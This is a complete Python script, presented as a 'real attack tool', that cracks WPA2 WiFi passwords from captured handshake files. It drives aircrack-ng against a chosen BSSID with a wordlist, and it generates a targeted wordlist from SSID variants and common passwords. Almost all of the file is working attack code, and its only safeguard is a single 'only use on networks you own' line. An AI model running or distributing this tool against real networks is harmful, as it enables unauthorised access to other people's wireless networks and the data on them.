#!/usr/bin/env python3
"""
🔍 HANDSHAKE ANALYZER - REAL ATTACK TOOL
=========================================
Real handshake file analysis and password cracking tool.
Works with existing .cap files from WiFi captures.

This tool performs REAL password attacks against captured handshakes.
"""

import subprocess
import os
import sys
import time
import hashlib
import binascii
from pathlib import Path

class RealHandshakeAnalyzer:
    def __init__(self):
        self.handshake_file = None
        self.target_ssid = None
        self.target_bssid = None
        
    def check_aircrack_availability(self):
        """Check if aircrack-ng is available"""
        try:
            result = subprocess.run(['aircrack-ng', '--help'], 
                                  capture_output=True, timeout=5)
            print("✅ aircrack-ng found")
            return True
        except (subprocess.TimeoutExpired, FileNotFoundError):
            print("❌ aircrack-ng not found")
            print("📦 Install with: brew install aircrack-ng")
            return False
    
    def analyze_handshake_file(self, cap_file):
        """Analyze a capture file for handshakes"""
        if not os.path.exists(cap_file):
            print(f"❌ File not found: {cap_file}")
            return None
        
        print(f"🔍 Analyzing handshake file: {cap_file}")
        
        try:
            # Use aircrack-ng to analyze the file
            result = subprocess.run([
                'aircrack-ng',
                cap_file
            ], capture_output=True, text=True, timeout=30)
            
            networks = []
            handshake_found = False
            
            # Parse aircrack-ng output
            lines = result.stdout.split('\n')
            for i, line in enumerate(lines):
                if 'WPA' in line and ('handshake' in line.lower() or 'eapol' in line.lower()):
                    handshake_found = True
                    
                # Extract network info
                if line.strip() and len(line.split()) >= 4:
                    parts = line.split()
                    if len(parts) >= 6 and ':' in parts[1]:  # BSSID format
                        try:
                            index = parts[0]
                            bssid = parts[1]
                            essid = ' '.join(parts[5:]) if len(parts) > 5 else 'Unknown'
                            networks.append({
                                'index': index,
                                'bssid': bssid,
                                'essid': essid.strip()
                            })
                        except:
                            pass
            
            if not networks:
                print("❌ No networks found in capture file")
                return None
            
            print(f"📡 Found {len(networks)} network(s) in capture:")
            for network in networks:
                status = "✅ Handshake" if handshake_found else "❌ No handshake"
                print(f"   {network['index']}. {network['essid']} ({network['bssid']}) - {status}")
            
            return networks
            
        except Exception as e:
            print(f"❌ Analysis failed: {e}")
            return None
    
    def crack_with_wordlist(self, cap_file, target_bssid, wordlist_file):
        """Crack handshake using wordlist attack"""
        if not os.path.exists(wordlist_file):
            print(f"❌ Wordlist not found: {wordlist_file}")
            return None
        
        print(f"🚀 Starting REAL wordlist attack...")
        print(f"📂 Handshake: {cap_file}")
        print(f"🎯 Target: {target_bssid}")
        print(f"📝 Wordlist: {wordlist_file}")
        
        try:
            # Count passwords in wordlist
            with open(wordlist_file, 'r') as f:
                password_count = sum(1 for line in f)
            print(f"📊 Testing {password_count:,} passwords...")
            
            # Run aircrack-ng attack - THIS IS REAL!
            start_time = time.time()
            
            result = subprocess.run([
                'aircrack-ng',
                '-a2',  # WPA2-PSK
                '-b', target_bssid,
                '-w', wordlist_file,
                cap_file
            ], capture_output=True, text=True, timeout=600)  # 10 minute timeout
            
            elapsed = time.time() - start_time
            
            # Parse output for results
            output = result.stdout
            
            if 'KEY FOUND!' in output:
                # Extract password
                for line in output.split('\n'):
                    if 'KEY FOUND!' in line:
                        password = line.split('[')[1].split(']')[0].strip()
                        
                        print(f"\n🎉 REAL PASSWORD CRACKED!")
                        print(f"🔑 Password: {password}")
                        print(f"⏱️  Time: {elapsed:.2f} seconds")
                        
                        # Calculate attack rate
                        rate = password_count / elapsed if elapsed > 0 else 0
                        print(f"📈 Attack rate: {rate:.0f} passwords/second")
                        
                        return password
            
            print(f"\n❌ Password not found in wordlist")
            print(f"⏱️  Time: {elapsed:.2f} seconds")
            print(f"📊 Tested: {password_count:,} passwords")
            
            return None
            
        except subprocess.TimeoutExpired:
            print("⏰ Attack timed out (10 minutes)")
            return None
        except Exception as e:
            print(f"❌ Attack failed: {e}")
            return None
    
    def generate_smart_wordlist(self, ssid, output_file="smart_wordlist.txt", size=50000):
        """Generate intelligent wordlist based on SSID"""
        print(f"🧠 Generating smart wordlist for: {ssid}")
        
        passwords = set()  # Use set to avoid duplicates
        
        # SSID-based passwords (most likely to work)
        ssid_lower = ssid.lower()
        ssid_variants = [
            ssid, ssid_lower, ssid.upper(), ssid.capitalize(),
            f"{ssid}1", f"{ssid}12", f"{ssid}123", f"{ssid}1234",
            f"{ssid}12345", f"{ssid}123456", f"{ssid}1234567", f"{ssid}12345678",
            f"{ssid}01", f"{ssid}001", f"{ssid}2025", f"{ssid}2024", f"{ssid}2023",
            f"{ssid}!", f"{ssid}@", f"{ssid}#", f"{ssid}$", f"{ssid}%",
            f"wifi{ssid}", f"{ssid}wifi", f"{ssid}password", f"password{ssid}",
            f"{ssid}admin", f"admin{ssid}", f"{ssid}home", f"home{ssid}",
            f"{ssid}net", f"net{ssid}", f"{ssid}user", f"user{ssid}",
        ]
        passwords.update(ssid_variants)
        
        # Top 1000 most common passwords
        common_passwords = [
            "password", "123456", "12345678", "qwerty", "abc123", "password123",
            "1234567", "password1", "12345", "1234567890", "123456789", "welcome",
            "admin", "login", "guest", "test", "user", "root", "pass", "default",
            "qwerty123", "letmein", "monkey", "dragon", "111111", "baseball",
            "iloveyou", "trustno1", "sunshine", "master", "123123", "welcome",
            "shadow", "ashley", "football", "jesus", "michael", "ninja", "mustang",
            "password1234", "123qwe", "qwerty12", "internet", "service", "computer",
            "superman", "696969", "batman", "hunter", "tigger", "charlie", "jordan",
            "jennifer", "zxcvbnm", "asdfgh", "michelle", "daniel", "starwars",
            "klaster", "112233", "george", "michelle", "jessica", "pepper", "1111",
            "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass123",
            "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese",
            "amanda", "summer", "love", "6969", "nicole", "chelsea", "biteme",
            "matthew", "access", "yankees", "987654321", "dallas", "austin",
            "thunder", "taylor", "matrix", "william", "corvette", "hello", "martin",
            "heather", "secret", "merlin", "diamond", "1234qwer", "gfhjkm", "hammer",
            "silver", "222222", "88888888", "anthony", "justin", "test123", "bailey",
            "q1w2e3r4t5", "patrick", "scooter", "orange", "11111", "golfer", "cookie"
        ]
        passwords.update(common_passwords)
        
        # WiFi-specific passwords
        wifi_passwords = [
            "internet", "wireless", "network", "router", "wifi", "wifi123",
            "internet123", "wireless123", "network123", "router123", "modem",
            "broadband", "connection", "access", "secure", "private", "home",
            "office", "guest", "public", "admin123", "root123", "user123"
        ]
        passwords.update(wifi_passwords)
        
        # Convert to list and limit size
        final_passwords = list(passwords)[:size]
        
        # Write to file
        with open(output_file, 'w') as f:
            for password in final_passwords:
                f.write(password + '\n')
        
        print(f"✅ Generated {len(final_passwords):,} passwords in {output_file}")
        return output_file
    
    def run_interactive_analysis(self):
        """Run interactive handshake analysis"""
        print("🔍 REAL HANDSHAKE ANALYZER")
        print("=" * 35)
        print("⚠️  REAL WiFi password cracking tool")
        print("⚠️  Only use on networks you own!")
        print()
        
        # Check requirements
        if not self.check_aircrack_availability():
            return
        
        # Get handshake file
        cap_file = input("📂 Enter path to handshake file (.cap): ").strip()
        if not cap_file:
            print("❌ No file specified")
            return
        
        # Analyze the file
        networks = self.analyze_handshake_file(cap_file)
        if not networks:
            return
        
        # Select target network
        if len(networks) > 1:
            try:
                choice = input("🎯 Select target network (number): ").strip()
                idx = int(choice) - 1
                target = networks[idx]
            except (ValueError, IndexError):
                print("❌ Invalid selection")
                return
        else:
            target = networks[0]
        
        self.target_bssid = target['bssid']
        self.target_ssid = target['essid']
        
        print(f"\n🎯 Target: {self.target_ssid} ({self.target_bssid})")
        
        # Choose attack method
        print("\n🔧 Select attack method:")
        print("   1. Smart wordlist (SSID-based + common passwords)")
        print("   2. Use existing wordlist file")
        
        choice = input("Choose method (1-2): ").strip()
        
        if choice == '1':
            # Generate smart wordlist
            wordlist_file = self.generate_smart_wordlist(self.target_ssid)
            password = self.crack_with_wordlist(cap_file, self.target_bssid, wordlist_file)
            
        elif choice == '2':
            # Use existing wordlist
            wordlist_file = input("📝 Enter wordlist file path: ").strip()
            if not wordlist_file or not os.path.exists(wordlist_file):
                print("❌ Wordlist file not found")
                return
            password = self.crack_with_wordlist(cap_file, self.target_bssid, wordlist_file)
            
        else:
            print("❌ Invalid choice")
            return
        
        # Final results
        if password:
            print(f"\n{'='*50}")
            print(f"🎉 REAL ATTACK SUCCESSFUL!")
            print(f"🔑 Network: {self.target_ssid}")
            print(f"🔑 Password: {password}")
            print(f"{'='*50}")
        else:
            print(f"\n{'='*50}")
            print(f"❌ ATTACK FAILED")
            print(f"💡 Try a different wordlist")
            print(f"{'='*50}")

def main():
    """Main function"""
    try:
        analyzer = RealHandshakeAnalyzer()
        analyzer.run_interactive_analysis()
    except KeyboardInterrupt:
        print("\n🛑 Analysis interrupted")
    except Exception as e:
        print(f"\n❌ Unexpected error: {e}")

if __name__ == "__main__":
    main()
